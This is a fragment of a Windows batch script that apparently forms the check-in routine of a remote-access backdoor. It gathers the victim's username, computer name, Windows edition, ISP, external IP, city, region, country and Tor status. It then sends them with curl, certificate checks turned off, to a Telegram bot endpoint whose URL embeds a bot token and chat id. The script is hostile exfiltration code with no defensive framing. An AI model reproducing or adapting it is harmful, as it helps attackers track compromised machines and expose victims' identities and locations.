...
for /f "usebackq delims=" %%U in (`powershell -Command %username% | Out-String -Encoding UTF8`) do set "utf8_username=%%U"
"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %utf8_username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
